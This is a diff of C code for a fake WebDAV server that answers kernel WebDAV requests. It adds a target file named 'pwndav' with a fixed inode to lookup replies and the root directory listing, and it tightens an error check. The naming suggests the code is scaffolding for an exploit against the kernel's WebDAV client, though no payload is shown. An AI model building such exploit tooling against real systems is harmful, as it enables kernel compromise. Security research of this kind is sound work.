@@ -26,6 +26,7 @@
 #define ROOT_ID CreateOpaqueID(1, 1)
 #define TARGET_NAME "pwndav"
 #define TARGET_ID CreateOpaqueID(1, 2)
+#define TARGET_INO WEBDAV_ROOTFILEID + 1
 
 struct handler_ctx {
   char source[PATH_MAX];
@@ -49,7 +50,7 @@ int handle_lookup(void *ctx, struct webdav_request_lookup* request, struct webda
       }
       
       reply->obj_id = TARGET_ID;
-      reply->obj_fileid = handler_ctx->destination_fd;
+      reply->obj_fileid = TARGET_INO;
       reply->obj_type = WEBDAV_FILE_TYPE;
       reply->obj_filesize = stat.st_size;
       reply->obj_atime.tv_sec = 1580000000;
@@ -263,8 +264,8 @@ int handler(void* ctx, int socket) {
   return webdav_kext_handle(&router, socket);
 }
 
-size_t setup_root_fd(int fd) {
-  struct webdav_dirent dirent[2];
+int setup_root_fd(int fd) {
+  struct webdav_dirent dirent[3];
   bzero(&dirent, sizeof(dirent));
   
   dirent[0].d_ino = WEBDAV_ROOTFILEID;
@@ -280,7 +281,17 @@ size_t setup_root_fd(int fd) {
   dirent[1].d_type = DT_DIR;
   dirent[1].d_reclen = sizeof(struct webdav_dirent);
   
-  return write(fd, &dirent, sizeof(dirent));
+  dirent[2].d_ino = TARGET_INO;
+  strncpy(dirent[2].d_name, TARGET_NAME, sizeof(dirent[2].d_name));
+  dirent[2].d_namlen = strnlen(TARGET_NAME, sizeof(TARGET_NAME));
+  dirent[2].d_type = DT_REG;
+  dirent[2].d_reclen = sizeof(struct webdav_dirent);
+  
+  if (sizeof(dirent) != write(fd, &dirent, sizeof(dirent))) {
+    return -1;
+  }
+  
+  return 0;
 }
 
 int main(int argc, char** argv) {
@@ -336,7 +347,7 @@ int main(int argc, char** argv) {
     return errno;
   }
   
-  if (setup_root_fd(handler_ctx.root_fd) <= 0) {
+  if (setup_root_fd(handler_ctx.root_fd) != 0) {
     printf("cannot setup root cache, error: %d \n", errno);
     return errno;
   }
